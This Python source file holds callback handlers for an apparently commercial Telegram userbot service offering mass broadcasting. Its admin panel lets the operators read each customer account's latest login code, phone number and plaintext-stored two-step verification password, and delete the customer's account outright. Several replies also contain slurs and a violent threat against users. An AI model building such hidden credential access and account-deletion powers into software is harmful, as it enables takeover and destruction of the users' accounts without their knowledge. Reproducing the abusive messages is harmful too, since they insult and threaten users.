import re
import traceback
from gc import get_objects

from pyrogram_styled import raw
from pyrogram_styled.errors import FloodPremiumWait, FloodWait, MessageNotModified
from pyrogram_styled.helpers import ikb
from pyrogram_styled.types import (InlineKeyboardMarkup, InputMediaAnimation,
                            InputMediaAudio, InputMediaDocument,
                            InputMediaPhoto, InputMediaVideo)
from pytz import timezone

from clients import bot, navy, session
from config import (BOT_NAME, HELPABLE, KYNAN, LOG_SELLER, SUDO_OWNERS,
                    USENAME_OWNER)
from database import dB, state
from helpers import ButtonUtils, Message, Tools, paginate_modules
from logs import logger

from .pmpermit_command import LIMIT


top_text = "👋 hai! saya adalah small userbot, saya bisa membantu pengguna untuk melakukan broadcast dengan lebih mudah dan instant.\n\n✏️ silahkan klik salah satu module dibawah ini untuk memunculkan command, penjelasan dan cara pengunaannya."
async def support_contact(_, message):
    reply_text = (
    "<b>📝 Silahkan klik tombol dibawah ini untuk mengarahkan anda kepada owner kami.</b>"
    )
    reply_markup = ikb(
            [
                [("🐭 Doksil Riyal", "5687267550", "user_id")],
                [("❌ Tutup", "buttonclose")],
            ]
        )
    return await message.reply(reply_text, reply_markup=reply_markup)

async def cb_help(client, callback_query):
    await callback_query.answer()
    mod_match = re.match(r"help_module\((.+?),(.+?)\)", callback_query.data)
    prev_match = re.match(r"help_prev\((.+?)\)", callback_query.data)
    next_match = re.match(r"help_next\((.+?)\)", callback_query.data)
    back_match = re.match(r"help_back\((\d+)\)", callback_query.data)
    create_match = re.match(r"help_create", callback_query.data)
    user_id = callback_query.from_user.id
    prefix = navy.get_prefix(user_id)
    x_ = next(iter(prefix))
    full = f"<a href=tg://user?id={callback_query.from_user.id}>{callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}</a>"
    cekpic = await dB.get_var(user_id, "HELP_LOGO")
    text_help = (
        await dB.get_var(user_id, "text_help")
        or f"**SMALL USERBOT BY @FLOOTUST**"
    )
    text_help2 = f"**SMALL USERBOT BY @FLOOTUST**"
    costum_cq = (
        callback_query.edit_message_caption
        if cekpic
        else callback_query.edit_message_text
    )
    costum_text = "caption" if cekpic else "text"
    if mod_match:
        module = mod_match.group(1)
        logger.info(f"line 48: {module}")
        prev_page_num = int(mod_match.group(2))
        state.set(user_id, "prev_page_num", prev_page_num)
        bot_text = f"{HELPABLE[module].__HELP__}".format(x_, text_help2)
        try:
            button = ikb(
                [
                    [
                        ("🔙 Back 🔙", f"help_back({prev_page_num})", "callback_data"),
                    ]
                ]
            )
            return await costum_cq(
                **{costum_text: bot_text},
                reply_markup=button,
            )
        except (FloodWait, FloodPremiumWait) as e:
            return await callback_query.answer(f"FloodWait {e}, Please Waiting!!", True)

        except MessageNotModified:
            return

    elif prev_match:
        curr_page = int(prev_match.group(1))
        try:
            return await costum_cq(
                **{
                    costum_text: top_text.format(
                        " ".join(prefix), len(HELPABLE), full, text_help
                    )
                },
                reply_markup=InlineKeyboardMarkup(
                    paginate_modules(curr_page, HELPABLE, "help")
                ),
            )
        except (FloodWait, FloodPremiumWait) as e:
            return await callback_query.answer(f"FloodWait {e}, Please Waiting!!", True)

        except MessageNotModified:
            return
    elif next_match:
        next_page = int(next_match.group(1))
        try:
            return await costum_cq(
                **{
                    costum_text: top_text.format(
                        " ".join(prefix), len(HELPABLE), full, text_help
                    )
                },
                reply_markup=InlineKeyboardMarkup(
                    paginate_modules(next_page, HELPABLE, "help")
                ),
            )
        except (FloodWait, FloodPremiumWait) as e:
            return await callback_query.answer(f"FloodWait {e}, Please Waiting!!", True)

        except MessageNotModified:
            return
    elif back_match:
        prev_page_num = int(back_match.group(1))
        try:
            return await costum_cq(
                **{
                    costum_text: top_text.format(
                        " ".join(prefix), len(HELPABLE), full, text_help
                    )
                },
                reply_markup=InlineKeyboardMarkup(
                    paginate_modules(prev_page_num, HELPABLE, "help")
                ),
            )
        except (FloodWait, FloodPremiumWait) as e:
            return await callback_query.answer(f"FloodWait {e}, Please Waiting!!", True)

        except MessageNotModified:
            return
    elif create_match:
        try:
            return await costum_cq(
                **{
                    costum_text: top_text.format(
                        " ".join(prefix), len(HELPABLE), full, text_help
                    )
                },
                reply_markup=InlineKeyboardMarkup(
                    paginate_modules(0, HELPABLE, "help")
                ),
            )
        except (FloodWait, FloodPremiumWait) as e:
            return await callback_query.answer(f"FloodWait {e}, Please Waiting!!", True)

        except MessageNotModified:
            return


async def del_userbot(_, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in SUDO_OWNERS:
        return await callback_query.answer(
            f"<b>GAUSAH DIPENCET YA ANJING! {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"<a href=tg://user?id={get_id}>{show.first_name} {show.last_name or ''}</a>"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"<a href=tg://user?id={get_id}>Userbot</a>"
    X = session.get_session(get_id)
    if X:
        try:
            await X.unblock_user(bot.me.username)
            await bot.send_message(
                X.me.id,
                f"<b>💬 Masa Aktif Anda Telah Habis</b>",
            )
        except Exception:
            pass
        await dB.remove_ubot(X.me.id)
        await dB.rem_expired_date(X.me.id)
        await dB.revoke_token(X.me.id, deleted=True)
        session.remove_session(X.me.id)
        try:
            await X.log_out()
        except Exception:
            pass
        return await bot.send_message(
            LOG_SELLER,
            f"<b> ✅ {get_mention} Deleted on database</b>",
        )


async def tools_acc(_, callback_query):
    data = callback_query.data
    parts = data.split()
    if len(parts) > 1:
        acc_data = parts[1].split("-")
        if len(acc_data) >= 2:
            user_id_acc = acc_data[0]
            count = int(acc_data[1])

            await callback_query.edit_message_text(
                await Message.userbot_detail(count),
                reply_markup=ButtonUtils.userbot_list(
                    user_id_acc,
                    count,
                    session.get_count(),
                ),
            )


async def page_acc(_, callback_query):
    data = callback_query.data.split()
    count = int(data[1])
    return await callback_query.edit_message_text(
        await Message.userbot_list(count),
        reply_markup=ButtonUtils.account_list(count),
    )


async def acc_page(_, callback_query):
    data = callback_query.data
    parts = data.split()
    if len(parts) > 1:
        start_index = int(parts[1])
        await callback_query.edit_message_text(
            await Message.userbot_list(start_index),
            reply_markup=ButtonUtils.account_list(start_index),
        )


async def prevnext_userbot(_, callback_query):
    await callback_query.answer()
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "prev_ub":
        count -= 1
    else:
        count += 1
    try:
        count = max(0, min(count, session.get_count() - 1))
        user_id_acc = session.get_list()[count]
        await callback_query.edit_message_text(
            await Message.userbot_detail(count),
            reply_markup=ButtonUtils.userbot_list(
                user_id_acc, count, session.get_count()
            ),
        )
    except Exception as e:
        return f"Error: {e}"


async def tools_userbot(_, callback_query):
    await callback_query.answer()
    user_id = callback_query.from_user.id
    query = callback_query.data.split()
    if user_id not in SUDO_OWNERS:
        return await callback_query.answer(
            f"<b>GAUSAH REWEL YA ANJING! {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    count = session.get_list()[int(query[1])]
    X = session.get_session(count)
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ Kode tidak ditemukan", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=(
                            ButtonUtils.userbot_list(X.me.id, int(query[1])),
                            session.get_count(),
                        ),
                    )
                    return await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)
    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"<b>📲 Nomer telepon <code>{X.me.id}</code> adalah <code>{X.me.phone_number}</code></b>",
                reply_markup=(
                    ButtonUtils.userbot_list(X.me.id, int(query[1])),
                    session.get_count(),
                ),
            )
        except Exception as error:
            return await callback_query.answer(error, True)
    elif query[0] == "get_faktor":
        code = await dB.get_var(X.me.id, "PASSWORD")
        if code == None:
            return await callback_query.answer(
                "🔐 Kode verifikasi 2 langkah tidak ditemukan", True
            )
        else:
            return await callback_query.edit_message_text(
                f"<b>🔐 Kode verifikasi 2 langkah pengguna <code>{X.me.id}</code> adalah : <code>{code}</code></b>",
                reply_markup=(
                    ButtonUtils.userbot_list(X.me.id, int(query[1])),
                    session.get_count(),
                ),
            )
    elif query[0] == "ub_deak":
        if user_id not in KYNAN:
            return await callback_query.answer(
                f"<b>GAUSAH REWEL YA ANJING! {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
                True,
            )
        return await callback_query.edit_message_reply_markup(
            reply_markup=(ButtonUtils.deak(X.me.id, int(query[1])))
        )
    elif query[0] == "deak_akun":
        if user_id not in KYNAN:
            return await callback_query.answer(
                f"<b>GAUSAH REWEL YA ANJING! {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
                True,
            )
        session.remove_session(int(query[1]))
        await X.invoke(raw.functions.account.DeleteAccount(reason="madarchod hu me"))
        return await callback_query.edit_message_text(
            Message.deak(X),
            reply_markup=(
                ButtonUtils.userbot_list(X.me.id, int(query[1])),
                session.get_count(),
            ),
        )


async def contact_admins(_, message):
    reply_text = (
        "<b>English:</b> Please write the message you want to convey with the hashtag #ask and please wait for the admin to reply.\n\n"
        "<b>Indonesia:</b> Silahkan tulis pesan yang ingin anda sampaikan dengan hastag #ask dan mohon tunggu sampai admin membalas."
    )
    reply_markup = ikb([[("🔙 Back", "starthome")]])
    return await message.reply(reply_text, reply_markup=reply_markup)


async def closed_user(client, callback_query):

    try:
        callback_query.from_user
        split = callback_query.data.split(maxsplit=1)[1]
        logger.info(f"ini split {split}")
        data = state.get(split, split)
        logger.info(f"ini data {data}")
        if not data:
            return await callback_query.answer("This button not for you fvck!!", True)
        message = next(
            (obj for obj in get_objects() if id(obj) == int(data["idm"])), None
        )
        c = message._client
        return await c.delete_messages(int(data["chat"]), int(data["_id"]))
    except Exception as er:
        logger.error(f"{str(er)}")


async def cek_expired_cb(client, cq):
    user_id = int(cq.data.split()[1])
    try:
        expired = await dB.get_expired_date(user_id)
        habis = expired.astimezone(timezone("Asia/Jakarta")).strftime("%Y-%m-%d %H:%M")
        return await cq.answer(f"⏳ Waktu: {habis}", True)
    except Exception:
        return await cq.answer("✅ Sudah tidak aktif", True)

async def closed_bot(_, cq):
    await cq.answer()
    if await dB.get_var(cq.from_user.id, "is_bot"):
        await dB.remove_var(cq.from_user.id, "is_bot")
        await dB.remove_var(cq.from_user.id, "is_bot_pro")
    try:
        return await cq.message.delete()
    except Exception:
        return


async def cb_notes(_, callback_query):
    data = callback_query.data.split("_")
    btn_close = state.get("close_notes", "getnote")
    dia = callback_query.from_user
    type_mapping = {
        "photo": InputMediaPhoto,
        "video": InputMediaVideo,
        "animation": InputMediaAnimation,
        "audio": InputMediaAudio,
        "document": InputMediaDocument,
    }
    try:
        notetag = data[-2].replace("cb_", "")
        gw = data[-1]
        # userbot = session.get_session(gw)
        noteval = await dB.get_var(int(gw), notetag, "notes")
        if not noteval:
            await callback_query.answer("Catatan tidak ditemukan.", True)
            return
        full = (
            f"<a href=tg://user?id={dia.id}>{dia.first_name} {dia.last_name or ''}</a>"
        )
        await dB.add_userdata(
            dia.id,
            dia.first_name,
            dia.last_name,
            dia.username,
            dia.mention,
            full,
            dia.id,
        )
        tks = noteval["result"].get("text")
        note_type = noteval["type"]
        file_id = noteval.get("file_id")
        note, button = ButtonUtils.parse_msg_buttons(tks)
        teks = await Tools.escape_tag(bot, dia.id, note, Tools.parse_words)
        button = await ButtonUtils.create_inline_keyboard(button, int(gw))
        for row in btn_close.inline_keyboard:
            button.inline_keyboard.append(row)
        try:
            if note_type == "text":
                await callback_query.edit_message_text(text=teks, reply_markup=button)

            elif note_type in type_mapping and file_id:
                InputMediaType = type_mapping[note_type]
                media = InputMediaType(media=file_id, caption=teks)
                await callback_query.edit_message_media(
                    media=media, reply_markup=button
                )

            else:
                await callback_query.edit_message_caption(
                    caption=teks, reply_markup=button
                )

        except (FloodWait, FloodPremiumWait) as e:
            return await callback_query.answer(f"FloodWait {e}, Please Waiting!!", True)
        except MessageNotModified:
            pass

    except Exception:
        return await callback_query.answer(
            "Terjadi kesalahan saat memproses catatan.", True
        )


async def callback_alert(client, callback_query):
    uniq = callback_query.data.split("_")[1]
    alert_text = await dB.get_var(uniq, f"{uniq}")
    if len(alert_text) > 200:
        return await callback_query.answer(
            "Alert text is too long, please keep it under 200 characters.",
            show_alert=True,
        )
    if r"\n" in alert_text:
        alert_text = alert_text.replace(r"\n", "\n")
    return await callback_query.answer(text=alert_text, show_alert=True)


async def pm_warn(app, callback_query):
    try:
        data = callback_query.data.split()
        client = int(data[1])
        target = int(data[2])
        Flood = state.get(client, target)
        pm_warns = await dB.get_var(client, "PMLIMIT") or LIMIT
        return await callback_query.answer(
            f"⚠️ You have a chance {Flood}/{pm_warns} ❗\n\nIf you insist on sending messages continuously then you will be ⛔ blocked automatically and we will 📢 report your account as spam",
            True,
        )
    except Exception:
        logger.error(f"ERROR: {traceback.format_exc()}")


async def selected_topic(_, callback_query):
    if not callback_query.from_user:
        return await callback_query.answer("ANAK ANJING!!", True)
    if callback_query.from_user.id not in session.get_list():
        return await callback_query.answer("GW BUNTUNGIN TANGAN LO YA MEMEK", True)
    data = callback_query.data.split("_")
    chat_id = int(data[1])
    tread_id = int(data[2])
    title = str(data[3])
    await dB.set_var(chat_id, "SELECTED_TOPIC", tread_id)
    return await callback_query.answer(f"Changed send topic to {title}.", True)








